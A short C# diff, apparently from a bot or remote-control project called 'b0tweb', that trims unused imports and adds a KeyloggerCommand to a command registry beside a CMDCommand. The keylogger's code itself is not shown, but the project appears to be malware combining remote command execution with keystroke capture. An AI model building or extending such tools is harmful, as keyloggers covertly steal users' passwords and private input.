@@ -1,15 +1,13 @@
 ﻿using System;
 using System.Threading;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 
 namespace b0tweb.Commands
 {
     static class CommandRegistry
     {
-        private static AbstractCommand[] _supportedCommands = { 
-            new CMDCommand(), 
+        private static AbstractCommand[] _supportedCommands = {
+            new CMDCommand(),
+            new KeyloggerCommand(),
         };
 
         /// <summary>
